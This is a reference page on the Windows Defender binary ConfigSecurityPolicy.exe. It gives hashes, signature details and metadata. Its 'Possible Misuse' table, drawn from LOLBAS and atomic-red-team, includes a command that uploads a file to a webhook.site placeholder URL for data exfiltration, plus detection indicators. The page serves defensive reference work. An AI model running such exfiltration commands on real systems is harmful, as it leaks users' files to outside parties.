---
title: ConfigSecurityPolicy.exe | Microsoft Security Client Policy Configuration Tool
excerpt: What is ConfigSecurityPolicy.exe?
---

# ConfigSecurityPolicy.exe 

* File Path: `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2001.10-0\ConfigSecurityPolicy.exe`
* Description: Microsoft Security Client Policy Configuration Tool

## Hashes

Type | Hash
-- | --
MD5 | `F5C7871AE44E7EFF31C44EBEBDF60A5D`
SHA1 | `C19CAE993ACD83B952553FA5B99E7F741BABC22C`
SHA256 | `4B90C5EAE610B164216398B9C28F00BF2DD7E46DB558C66C99090EA0C047C133`
SHA384 | `4DC4208F8CDF031C6701EBD4C2FAAEA74E92718BACDA514F398F46D7D59042017D097ADBF21BF9A4A519636E0050749F`
SHA512 | `6A21A24B49DE7E9A4997A897C26449A33B8BED3FCEBED2B09A77A5BBD83FD853466EB11F6BAF3D98A1D4CF7795EDFD65AFAFAE09B5317D91227D7502BE17E5F2`
SSDEEP | `3072:FxLrofs9P7AqfaVETO5Ee6iaeHJlN87cEkPSEo3+fXa/MWKeGfS+mugPy0nCvgSs:FV0fs9P0qEkO5VScfo3nhuzvgnbZ`

## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: ConfigSecurityPolicy.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 4.18.18362.1 (WinBuild.160101.0800)
* Product Version: 4.18.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `ConfigSecurityPolicy.exe` being misused. While `ConfigSecurityPolicy.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `Name: ConfigSecurityPolicy.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: ConfigSecurityPolicy storing data into alternate data streams.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: Data Exfiltration with ConfigSecurityPolicy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: Data Exfiltration with ConfigSecurityPolicy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | - [Atomic Test #1 - Data Exfiltration with ConfigSecurityPolicy](#atomic-test-1---data-exfiltration-with-configsecuritypolicy) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | ## Atomic Test #1 - Data Exfiltration with ConfigSecurityPolicy | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | Exfiltration of data using ConfigSecurityPolicy.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | $path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


